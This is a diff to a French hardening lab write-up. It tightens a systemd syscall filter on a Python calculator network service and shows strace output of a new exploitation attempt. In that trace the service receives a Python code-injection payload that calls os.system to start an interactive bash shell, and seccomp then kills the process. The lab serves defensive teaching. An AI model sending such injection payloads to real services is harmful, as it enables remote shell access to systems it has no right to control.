@@ -827,7 +827,7 @@ write(1, "\nTP1 : Hardening basics\n\n\nPart I"..., 36871) = 36871
     User=calculatrice
 
     # Filtrage des appels système
-    SystemCallFilter=accept4 getsockname recvfrom sendto close write rt_sigaction getpeername munmap exit_group
+    SystemCallFilter=~clone3 rt_sigprocmask wait4
     SystemCallArchitectures=native
     NoNewPrivileges=yes
 
@@ -836,7 +836,39 @@ write(1, "\nTP1 : Hardening basics\n\n\nPart I"..., 36871) = 36871
 
     [toto@localhost ~]$ sudo systemctl daemon-reload
     [toto@localhost ~]$ sudo systemctl restart calculatrice
+    [toto@localhost ~]$ sudo systemctl status calculatrice
+    ● calculatrice.service - Super serveur calculatrice
+         Loaded: loaded (/etc/systemd/system/calculatrice.service; disabled; preset: disabled)
+         Active: active (running) since Wed 2025-02-12 00:10:23 CET; 3s ago
+       Main PID: 1450 (python3)
+          Tasks: 1 (limit: 11097)
+         Memory: 3.4M
+            CPU: 24ms
+         CGroup: /system.slice/calculatrice.service
+                 └─1450 /usr/bin/python3 /opt/calc.py
 ```
+
+- Nouvelle tentative d'exploitation
+
+```bash
+    [toto@localhost ~]$ sudo strace -f -p $(pgrep -f "python3 /opt/calc.py") -o trace_normal.txt
+    strace: Process 1463 attached
+    [toto@localhost ~]$ cat trace_normal.txt 
+    1463  accept4(3, {sa_family=AF_INET, sin_port=htons(40202), sin_addr=inet_addr("192.168.56.1")}, [16], SOCK_CLOEXEC) = 4
+    1463  getsockname(4, {sa_family=AF_INET, sin_port=htons(13337), sin_addr=inet_addr("192.168.56.114")}, [128 => 16]) = 0
+    1463  recvfrom(4, "\n", 1024, 0, NULL, NULL) = 1
+    1463  sendto(4, "Hello", 5, 0, NULL, 0) = 5
+    1463  recvfrom(4, "1+1\n", 1024, 0, NULL, NULL) = 4
+    1463  sendto(4, "2", 1, 0, NULL, 0)     = 1
+    1463  recvfrom(4, "\n", 1024, 0, NULL, NULL) = 1
+    1463  sendto(4, "Hello", 5, 0, NULL, 0) = 5
+    1463  recvfrom(4, "__import__(\"os\").system(\"bash -i"..., 1024, 0, NULL, NULL) = 70
+    1463  rt_sigaction(SIGINT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f650d03e730}, {sa_handler=0x7f650d4d3f83, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f650d03e730}, 8) = 0
+    1463  rt_sigaction(SIGQUIT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f650d03e730}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
+    1463  rt_sigprocmask(SIG_BLOCK, [CHLD], [ILL], 8) = 14
+    1463  +++ killed by SIGSYS (core dumped) +++
+```
+
 
 ---
 
